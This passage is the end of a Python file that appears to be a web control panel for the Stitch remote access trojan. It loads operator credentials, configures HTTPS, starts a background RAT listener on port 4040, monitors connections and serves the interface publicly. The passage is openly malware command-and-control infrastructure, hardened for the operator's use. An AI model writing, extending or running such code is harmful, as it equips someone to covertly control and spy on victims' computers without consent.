                'timestamp': datetime.now().isoformat()
            }, namespace='/')
        except:
            pass
        time.sleep(SERVER_RETRY_DELAY_SECONDS)

def start_stitch_server():
    """Start the Stitch server"""
    log_debug("Initializing Stitch RAT server", "INFO", "Server")
    try:
        server = get_stitch_server()
        # Start listening on port 4040
        server.do_listen('4040')
        log_debug("Stitch server listening on port 4040", "INFO", "Server")
    except Exception as e:
        log_debug(f"Stitch server error: {str(e)}", "ERROR", "Server")

# ============================================================================
# Main
# ============================================================================
if __name__ == '__main__':
    print("\n" + "="*75)
    print("🔐 Stitch RAT - Secure Web Interface")
    print("="*75 + "\n")
    
    # Load and validate credentials before starting
    # Note: USERS is module-level, so this assignment updates the global dict
    try:
        loaded_creds = load_credentials()
        USERS.update(loaded_creds)
        log_debug("✓ Credentials loaded from environment variables", "INFO", "Security")
    except RuntimeError as e:
        print(str(e))
        sys.exit(1)
    
    log_debug("Starting Stitch Web Interface (Real Integration)", "INFO", "System")
    
    # Configure SSL/HTTPS
    ssl_cert, ssl_key = get_ssl_context()
    if ssl_cert and ssl_key:
        ssl_context = (ssl_cert, ssl_key)
        protocol = "https"
        log_debug("HTTPS enabled - encrypted communication active", "INFO", "Security")
    else:
        ssl_context = None
        protocol = "http"
        if os.getenv('STITCH_ENABLE_HTTPS', 'false').lower() in ('true', '1', 'yes'):
            print("⚠️  WARNING: HTTPS requested but SSL setup failed - falling back to HTTP")
            log_debug("HTTPS requested but failed - using HTTP", "WARNING", "Security")
        else:
            log_debug("HTTP mode - credentials transmitted in clear text!", "WARNING", "Security")
    
    # Get configured port
    port = int(os.getenv('STITCH_WEB_PORT', '5000'))
    
    # Start Stitch server in background
    stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
    stitch_thread.start()
    
    # Start connection monitor
    monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
    monitor_thread.start()
    
    # Configure debug mode - default to False for security
    debug_mode = os.getenv('STITCH_DEBUG', 'false').lower() in ('true', '1', 'yes')
    
    print(f"\n🌐 Web interface: {protocol}://0.0.0.0:{port}")
    if ssl_context:
        print(f"🔒 HTTPS: Enabled (encrypted communication)")
    else:
        print(f"⚠️  HTTP: No encryption - credentials sent in clear text!")
        print(f"   For production, enable HTTPS: export STITCH_ENABLE_HTTPS=true")
    
    if debug_mode:
        print("\n" + "="*75)
        print("⚠️  WARNING: DEBUG MODE ENABLED")
        print("="*75)
        print("Debug mode is DANGEROUS in production!")
        print("  - Exposes sensitive stack traces")
        print("  - Allows arbitrary code execution via Werkzeug debugger")
        print("  - Leaks internal application structure")
        print("  - Performance overhead")
        print("\nNEVER use debug mode in production!")
        print("Set STITCH_DEBUG=false or remove the variable")
        print("="*75 + "\n")
        log_debug("DEBUG MODE ENABLED - NOT SAFE FOR PRODUCTION", "WARNING", "Security")
    else:
        print(f"✓ Debug mode: Disabled (production-safe)")
        log_debug("Debug mode disabled - production configuration", "INFO", "Security")
    
    print()  # Empty line for readability
    
    # Start web server with or without SSL
    socketio.run(
        app,
        host='0.0.0.0',
        port=port,
        debug=debug_mode,
        use_reloader=False,
        log_output=True,
        certfile=ssl_cert if ssl_context else None,
        keyfile=ssl_key if ssl_context else None
    )
